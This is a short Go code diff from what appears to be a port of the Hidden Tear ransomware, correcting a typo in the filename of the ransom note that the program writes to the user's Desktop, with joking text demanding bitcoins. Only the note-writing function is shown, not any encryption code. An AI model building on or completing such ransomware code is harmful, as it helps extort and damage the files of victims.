@@ -77,7 +77,7 @@ func main() {
 }
 
 func MessageCreator() {
-	var path string = "\\Desktop\\test\\REAT_IT.txt"
+	var path string = "\\Desktop\\test\\READ_IT.txt"
 	var fullPath string = UserDir + UserName + path
 	lines := []string{ "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." }
 	file, err := os.Create(fullPath)
